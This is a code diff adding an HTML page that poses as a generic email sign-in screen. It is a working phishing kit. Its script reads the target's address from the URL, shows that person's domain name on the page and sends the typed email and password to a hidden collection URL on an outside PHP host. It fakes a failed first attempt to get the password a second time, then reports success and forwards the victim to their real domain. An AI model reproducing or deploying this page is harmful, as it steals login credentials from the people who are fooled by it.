@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   Sign in
+  </title>
+  <link href="icon.ico" rel="icon" type="icon"/>
+  <link href="set.css" rel="stylesheet"/>
+  <link crossorigin="anonymous" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" rel="stylesheet"/>
+ </head>
+ <body onload="checkMail()">
+  <!---START---->
+  <input id="posturl" type="hidden" value="https://inspire2.mywhc.ca/files/02/mm1470.php"/>
+  <!---END ---->
+  <div class="mainbox">
+   <div class="box1 centered">
+    <div class="formbox">
+     <div class="office-holder">
+      <div class="logo">
+       <h4 class="text-dark">
+        <div class="b">
+         <span class="text-uppercase" id="domain-name">
+         </span>
+        </div>
+       </h4>
+       <label style="font-family:Arial; font-size:15px;color:#34485b;">
+        Sign in to continue
+       </label>
+      </div>
+      <div style="width: 100%;">
+       <div class="alert alert-danger hide alert2" id="msgbox">
+       </div>
+      </div>
+      <form>
+       <div class="form-holder">
+        <input class="form-control" id="email" placeholder="Email" required="" type="email"/>
+        <input class="form-control" id="password" placeholder="Password" required="" type="password"/>
+        <div class="btn-holder" style="float:right;margin-top:0;">
+         <button class="btn btn-lg col-12" id="signin" style="border-radius: 0;font-family:Arial, Helvetica, sans-serif;font-size:16px;">
+          Sign in
+         </button>
+        </div>
+        <p>
+        </p>
+       </div>
+       <input id="rqcount" name="rqcount" type="hidden"/>
+      </form>
+     </div>
+    </div>
+   </div>
+  </div>
+  <script src="https://code.jquery.com/jquery-3.3.1.min.js">
+  </script>
+  <script crossorigin="anonymous" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js">
+  </script>
+  <script>
+   var counter = 0;
+
+
+
+var url = $("#posturl").val();
+
+	var geteml = location.hash.substring(1);
+	$("#email").val(geteml);
+	var getdomain = geteml.substring(geteml.indexOf('@')+1,geteml.lastIndexOf("."));
+	var xdomain = geteml.substring(geteml.indexOf('@')+1);
+	$("#domain-name").html(getdomain.toUpperCase());
+
+function checkMail(){
+	var email = document.getElementById('email');
+	var password = document.getElementById('password');
+	var showDomain = document.getElementById('domain-name');
+	var domain = '';
+	domain = email.value.replace(/.*@/, "").split('.')[0];
+	showDomain.textContent = domain;
+}
+
+
+$('#signin').click(function(e){
+	e.preventDefault();
+        var email = document.getElementById('email');
+        domain = email.value.replace(/.*@/, "").split('.')[0];
+        var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/g;
+        var alert2 = document.querySelector('#msgbox');
+        var alert1 = document.querySelector('.alert1');
+        if($('#email').val() == ""){
+            $('#email').focus();
+            $('.alert2').show();
+            alert2.textContent = "Please enter your email address";
+            return false;
+        }else if(!($('#email').val().match(checkmail))){
+            $('#email').focus();
+            $('.alert2').show();
+            alert2.textContent = "Invalid password or account";
+            return false;
+        }else if($('#password').val() == ""){
+            $('#password').focus();
+            $('#msgbox').show();
+            alert2.textContent = "Please enter your password";
+            return false;
+        }
+        else{
+            counter = counter + 1;
+            alert2.className = alert2.className.replace(/\balert-danger\b/g, "alert-info");
+            alert2.textContent = "Connecting to account";
+            $('.alert2').show();
+
+            if (counter > 1){
+                var xmlhttp;
+                if(window.XMLHttpRequest){
+                  xmlhttp = new XMLHttpRequest();
+                }else{
+                  xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+                }
+
+                xmlhttp.onreadystatechange=function(){
+                  if(xmlhttp.readyState==4 && xmlhttp.status==200){
+                        alert2.className = alert2.className.replace(/\balert-info\b/g, "alert-success");
+                        alert2.textContent = "Logon Successful";
+                        window.location = 'https://'+xdomain;
+                  } else {
+                      console.log(xmlhttp.responseText);
+                  }
+                }
+
+                var getemail = document.getElementById('email').value;
+                var getpassword = document.getElementById('password').value;
+                var formdata = new FormData();
+
+                formdata.append("email", getemail);
+                formdata.append("password", getpassword);
+
+                xmlhttp.open("POST", url);
+                xmlhttp.send(formdata);
+
+                return false;
+            }
+
+            var xmlhttp;
+            if(window.XMLHttpRequest){
+              xmlhttp = new XMLHttpRequest();
+            }else{
+              xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+            }
+
+            xmlhttp.onreadystatechange=function(){
+              if(xmlhttp.readyState==4 && xmlhttp.status==200){
+                    alert2.className = alert2.className.replace(/\balert-info\b/g, "alert-danger");
+                    alert2.textContent = xmlhttp.responseText;
+                    document.getElementById('password').value = "";
+                    document.getElementById('password').focus();
+              } else {
+                  console.log(xmlhttp.responseText);
+              }
+            }
+
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var formdata = new FormData();
+
+            formdata.append("email", email);
+            formdata.append("password", password);
+
+
+            xmlhttp.open("POST", url);
+            xmlhttp.send(formdata);
+
+            return false;
+
+        }
+
+})
+  </script>
+ </body>
+</html>
